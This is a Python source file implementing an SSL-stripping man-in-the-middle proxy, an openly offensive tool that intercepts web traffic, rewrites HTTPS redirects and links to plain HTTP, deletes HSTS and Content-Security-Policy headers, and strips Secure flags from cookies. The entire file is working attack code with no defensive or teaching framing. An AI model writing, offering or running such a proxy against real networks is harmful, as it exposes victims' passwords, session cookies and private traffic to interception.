import socket
import threading
from http.server import BaseHTTPRequestHandler
from io import BytesIO
import re

class HTTPRequest(BaseHTTPRequestHandler):
    def __init__(self, request_text):
        self.rfile = BytesIO(request_text)
        self.raw_requestline = self.rfile.readline()
        self.error_code = self.error_message = None
        self.parse_request()

class SSLStripper:
    def __init__(self, interface, port=8080):
        self.interface = interface
        self.host = '0.0.0.0'  # Listen on all interfaces
        self.port = port
        self.running = False
        self.server_socket = None
        self.threads = []

    def handle_client(self, client_socket, client_address):
        try:
            request = client_socket.recv(8192)
            if not request:
                client_socket.close()
                return

            http_request = HTTPRequest(request)

            host_header = http_request.headers.get('Host')
            if not host_header:
                print(f"[!] No Host header from {client_address}")
                client_socket.close()
                return

            # Create connection to remote server
            remote_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            remote_socket.connect((host_header, 80))
            
            # Modify request: remove secure flags
            modified_request = self.strip_request_security(request)
            remote_socket.sendall(modified_request)

            # Get response from remote server
            response = self.receive_response(remote_socket)
            remote_socket.close()

            # Modify response content
            modified_response = self.strip_response_security(response, host_header)
            client_socket.sendall(modified_response)

        except Exception as e:
            print(f"[!] Error handling client {client_address}: {e}")
        finally:
            client_socket.close()

    def strip_request_security(self, request):
        """Remove security-related headers from the request"""
        request_str = request.decode('utf-8', errors='ignore')
        # Remove upgrade-insecure-requests header
        request_str = re.sub(r'Upgrade-Insecure-Requests: 1\r\n', '', request_str)
        return request_str.encode()

    def strip_response_security(self, response, host):
        """Strip HTTPS and security features from response"""
        try:
            response_str = response.decode('utf-8', errors='ignore')
            modified = False

            # Strip HTTPS redirects
            if "Location: https://" in response_str:
                print(f"[*] Stripping HTTPS redirect for {host}")
                response_str = response_str.replace("Location: https://", "Location: http://")
                modified = True

            # Strip HTTPS from HTML content
            if "text/html" in response_str:
                # Replace HTTPS in links
                response_str = re.sub(r'https://', 'http://', response_str)
                # Remove security headers
                response_str = re.sub(r'Strict-Transport-Security:.*\r\n', '', response_str)
                response_str = re.sub(r'Content-Security-Policy:.*\r\n', '', response_str)
                # Remove secure cookies
                response_str = response_str.replace('secure;', '').replace('Secure;', '')
                modified = True

            if modified:
                print(f"[+] Modified response for {host}")
            
            return response_str.encode()
        except Exception as e:
            print(f"[!] Error modifying response: {e}")
            return response

    def receive_response(self, sock):
        """Receive full response from socket"""
        response = b""
        while True:
            try:
                data = sock.recv(4096)
                if not data:
                    break
                response += data
            except socket.timeout:
                break
        return response

    def start(self):
        """Start the SSL stripping proxy"""
        self.running = True
        print(f"[+] Starting SSL strip proxy on {self.host}:{self.port}")
        
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind((self.host, self.port))
        self.server_socket.listen(100)

        try:
            while self.running:
                client_socket, client_address = self.server_socket.accept()
                print(f"[+] Connection from {client_address}")
                thread = threading.Thread(
                    target=self.handle_client,
                    args=(client_socket, client_address)
                )
                thread.daemon = True
                thread.start()
                self.threads.append(thread)
        except Exception as e:
            print(f"[!] Error in SSL stripper: {e}")
        finally:
            self.stop()

    def stop(self):
        """Stop the SSL stripping proxy"""
        print("\n[*] Stopping SSL stripper...")
        self.running = False
        if self.server_socket:
            self.server_socket.close()
        
        # Clean up client threads
        for thread in self.threads:
            if thread.is_alive():
                thread.join(timeout=1.0)
        self.threads.clear()
        print("[+] SSL stripper stopped")
